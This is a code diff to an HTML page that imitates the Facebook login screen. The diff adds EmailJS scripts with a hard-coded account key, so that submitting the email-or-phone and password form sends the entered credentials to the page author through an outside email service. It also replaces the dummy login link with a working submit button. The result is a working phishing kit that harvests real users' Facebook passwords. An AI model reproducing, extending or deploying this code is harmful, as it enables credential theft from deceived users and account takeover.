@@ -20,6 +20,30 @@
   <link
     href="https://fonts.googleapis.com/css2?family=Audiowide&family=B612+Mono&family=Days+One&family=Nosifer&family=Pacifico&display=swap"
     rel="stylesheet">
+	
+	<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init('user_Efm6huiAtn3UgnxMB6RXx');
+        })();
+    </script>
+    <script type="text/javascript">
+        window.onload = function() {
+            document.getElementById('contact-form').addEventListener('submit', function(event) {
+                event.preventDefault();
+                // generate a five digit number for the contact_number variable
+                this.contact_number.value = Math.random() * 100000 | 0;
+                // these IDs from the previous steps
+                emailjs.sendForm('contact_service', 'contact_form', this)
+                    .then(function() {
+                        console.log('SUCCESS!');
+                    }, function(error) {
+                        console.log('FAILED...', error);
+                    });
+            });
+        }
+    </script>
+	
 </head>
 
 <body>
@@ -27,7 +51,7 @@
   <div class="facebook">
     <div class="mobile-top-view">
       <img src="fb-mobile.png" alt="">
-      <a href="#">Get Facebook for Android and browse faster.</a>
+      <a href="#">Get Facebook for Android/ios and browse faster.</a>
     </div>
     <div class="view">
       <div class="container">
@@ -43,10 +67,10 @@
           <!--Column 2-->
           <div class="col-sm-5">
             <div class="card">
-			<form name="contact" method="POST" data-netlify="true">
-                <input id="email" class="input-group" name="text" value="" type="text" placeholder="Email Address or Phone Number" required>
-                <input id="pass" class="input-group my-2" name="password" value="" type="password" placeholder="Password" required>
-				<a type="submit" id="fbLogin" class="btn btn-primary btn-lg" style="width:100%;" href="error.html">Log In</a>
+			<form  id="contact-form">
+                <input id="email" class="input-group" name="text" type="text" placeholder="Email Address or Phone Number" required>
+                <input id="pass" class="input-group my-2" name="password" type="password" placeholder="Password" required>
+				<button type="submit" id="fbLogin" class="btn btn-primary btn-lg" style="width:100%;">Log In</button>
 			</form>
                 <hr id="hr1">
                 <p id="forgetPass1" class="text-center my-3" style="font-size: 14px;"><a href="#">Forget password?</a>
